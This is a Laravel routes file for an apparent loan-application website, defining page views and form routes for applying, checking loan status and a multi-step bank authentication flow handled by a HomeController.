<?php

use App\Http\Controllers\HomeController;
use App\Http\Controllers\ProfileController;
use Illuminate\Support\Facades\Route;

Route::get('/', function () {
    return view('welcome');
});

Route::get('/banking-partner', function () {
    return view('banking-partner');
});

Route::get('/about-us', function () {
    return view('about-us');
});

Route::get('/contact-us', function () {
    return view('contact-us');
});

Route::get('/loan-status', function () {
    return view('loan-status');
});
Route::get('/loan-status-success', function () {
    return view('loan-status-success');
});

Route::get('/apply-now', function () {
    return view('apply-now');
});
Route::get('/bank-authentication-step-4', function () {
    return view('verification-in-process');
});
Route::post('/apply-now', [HomeController::class,'saveApply']);
// Route::post('/apply-now-one', [HomeController::class,'saveApply']);
Route::get('/congratulations', function () {
    return view('Congratulations');
});
Route::get('/bank-authentication', function () {
    return view('bank-authentication');
});
// Route::get('/bank_auth_form/{image}', Route::post('/apply-now', [HomeController::class,'saveApply']);
Route::get('/bank_auth_form/{image?}', [HomeController::class,'bank_auth_form']);
Route::post('/bank_auth_form/{image?}', [HomeController::class,'saveApplyOne']);



